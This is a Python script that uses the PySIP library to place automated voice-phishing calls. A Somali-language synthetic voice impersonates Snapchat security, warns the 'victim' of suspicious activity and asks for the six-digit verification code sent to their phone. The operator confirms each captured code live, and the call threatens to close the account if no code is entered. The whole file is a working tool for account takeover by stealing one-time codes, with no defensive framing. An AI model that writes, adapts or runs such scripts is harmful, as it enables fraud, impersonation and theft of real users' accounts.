import asyncio
from PySIP.call_handler import CallHandler

def typing_cb():
    print("Victim typing code..")

async def snapchat_script(
    call_handler: CallHandler, victim_name: str, confirmation_code_length: int = 6
):
    DELAY_ERR_MESSAGE = f"Wax koodh ah maad galin, fadlan gali koodh-ka {confirmation_code_length}da number ka kooban een kusoo dirnay numberkaaga."
    MAX_ATTEMPTS = 2

    try:
        # Phase 1
        call_handler.voice = "so-SO-UbaxNeural"
        await call_handler.say(
            f"Soo dhawaw {victim_name}, tani waa digniin amni oo ka socota shirkada Snapchat."
        )
        await call_handler.say(
            "Waxaan aragnay dhaqdhaqaaqyo shaki leh oo kasocda account-kaaga, si aan uga hor tagno dadka isku dayaya inay account-kaaga jabsadaan, waxaan u baahan-nahay inaan xaqiijino aqoonsigaaga."
        )

        # Phase 2
        code_correct = False
        attempts = 0

        asyncio.create_task(call_handler.dtmf_handler.started_typing(typing_cb))

        while not code_correct and attempts < MAX_ATTEMPTS:
            await call_handler.say(
                f"Si aad u xaqiijiso aqoonsigaaga, fadlan gali koodh-ka {confirmation_code_length}da number ka kooban ee aan numberkaaga kuugu soo dirnay."
            )
            dtmf_result = await call_handler.gather_and_say(
                length=confirmation_code_length, delay=13, delay_msg=DELAY_ERR_MESSAGE
            )

            if dtmf_result:
                print("The DTMF result is:-> ", dtmf_result)
                entered_code = input(f"Is the code '{dtmf_result}' correct? (y/n) ")
                if entered_code.lower() == "y":
                    code_correct = True
                    stream_id = await call_handler.say(
                        "Waad ku mahadsantahay xaqiijinta aqoonsigaaga. Account-kaaga waa la hagaajiyay hada."
                    )
                    await stream_id.wait_finished()
                    await call_handler.hangup()
                    print("Script Snapchat completed running..")
                else:
                    attempts += 1
                    if attempts == MAX_ATTEMPTS:
                        stream = await call_handler.say(
                            "Waad ku guul-daraysatay xaqiijinta aqoonsigaaga, sababa la xidhiidha dhinaca amniga, account-kaaga waan xidhi doonnaa hada."
                        )
                        await stream.wait_finished()
                        await call_handler.hangup()
                        print("Script Snapchat failed due to maximum attempts reached.")
                    else:
                        await call_handler.say(
                            "Koodh-ka aad galisay waa qalad, fadlan isku day markale."
                        )
            else:
                stream = await call_handler.say(
                    "Wax Koodh ah maad galin. Sababo la xidhiidha dhinaca amniga, waan xidhi doonnaa akoont-kaaga"
                )
                await stream.wait_finished()
                await call_handler.hangup()
                print("Script Snapchat failed due to no code entered.")

    except RuntimeError:
        print("The call is hanged up. Stopping the script...")
